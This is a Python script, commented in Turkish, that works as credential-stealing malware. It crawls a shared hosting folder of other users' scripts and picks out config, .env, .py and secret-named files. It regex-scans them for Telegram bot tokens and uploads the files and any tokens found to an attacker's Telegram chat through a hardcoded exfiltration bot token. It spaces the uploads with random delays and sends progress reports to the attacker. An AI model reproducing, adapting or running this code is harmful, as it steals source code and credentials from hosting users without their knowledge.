import os
import re
import time
import random
import requests
from datetime import datetime

MY_CHAT_ID = "8216576697"
EXFIL_TOKEN = "7869982853:AAGkI5v1o028LUaI4q-KCcqcotoH9nFsDyA"
API = f"https://api.telegram.org/bot{EXFIL_TOKEN}/"

s = requests.Session()

def api(method, **kwargs):
    url = API + method
    try:
        if "files" in kwargs:
            r = s.post(url, data=kwargs.get("data", {}), files=kwargs["files"], timeout=90)
        else:
            r = s.post(url, data=kwargs, timeout=40)
        return r.json()
    except:
        return {"ok": False}

def mesaj_gonder(text):
    if len(text) > 3900:
        text = text[:3800] + "\n... kesildi"
    api("sendMessage", chat_id=MY_CHAT_ID, text=text)

def dosya_gonder(yol):
    if not os.path.isfile(yol):
        return False
    
    if os.path.getsize(yol) > 50 * 1024 * 1024:
        mesaj_gonder(f"Çok büyük geçti: {os.path.basename(yol)}")
        return False

    try:
        with open(yol, "rb") as f:
            files = {"document": (os.path.basename(yol), f)}
            data = {"chat_id": str(MY_CHAT_ID)}
            resp = api("sendDocument", data=data, files=files)
        return resp.get("ok", False)
    except:
        return False

def token_var_mi(icerik):
    pat = r"([0-9]{8,11}:[A-Za-z0-9_-]{35,46})"
    return re.findall(pat, icerik)

def kritik_dosya(dosya_adi):
    ad = dosya_adi.lower()
    kritik_uzantilar = (".py", ".env", ".json", ".yml", ".yaml", ".ini", ".toml", ".cfg")
    kritik_kelimeler = ["bot", "token", "config", "main", "settings", "api", "secret", "key"]
    
    return ad.endswith(kritik_uzantilar) or any(k in ad for k in kritik_kelimeler)

def tara_ve_direkt_gonder():
    hedef_klasor = "/home/runner/workspace/hosted_scripts/"
    
    if not os.path.exists(hedef_klasor) or not os.path.isdir(hedef_klasor):
        mesaj_gonder(f"KLASÖR BULUNAMADI → {hedef_klasor}")
        return

    mesaj_gonder(f"Taranıyor: {hedef_klasor}")

    bulunanlar = []

    for root, dirs, files in os.walk(hedef_klasor):
        for dosya in files:
            tam_yol = os.path.join(root, dosya)
            if kritik_dosya(dosya):
                bulunanlar.append(tam_yol)

    toplam = len(bulunanlar)
    mesaj_gonder(f"{toplam} adet kritik dosya bulundu → gönderiyorum")

    gonderilen = 0

    for idx, yol in enumerate(bulunanlar, 1):
        isim = os.path.basename(yol)
        
        # Token kontrolü
        try:
            with open(yol, "r", encoding="utf-8", errors="ignore") as f:
                icerik = f.read(600_000)
            tokenlar = token_var_mi(icerik)
            if tokenlar:
                mesaj_gonder(f"TOKEN VAR!\n{yol}\n" + "\n".join(tokenlar[:5]))
        except:
            pass

        if dosya_gonder(yol):
            gonderilen += 1
            mesaj_gonder(f"Gönderildi → {isim}  [{idx}/{toplam}]")
        else:
            mesaj_gonder(f"Atlandı → {isim}  (hata / büyük / erişim yok)")

        time.sleep(random.uniform(4.5, 9.0))

    mesaj_gonder(
        "█ B İ T T İ █\n"
        f"Klasör: {hedef_klasor}\n"
        f"Toplam kritik dosya: {toplam}\n"
        f"Başarıyla gönderilen: {gonderilen}\n"
        f"Tarih: {datetime.now().strftime('%Y-%m-%d %H:%M')}"
    )

if __name__ == "__main__":
    try:
        tara_ve_direkt_gonder()
    except Exception as e:
        mesaj_gonder(f"CRITICAL HATA:\n{str(e)[:1000]}")
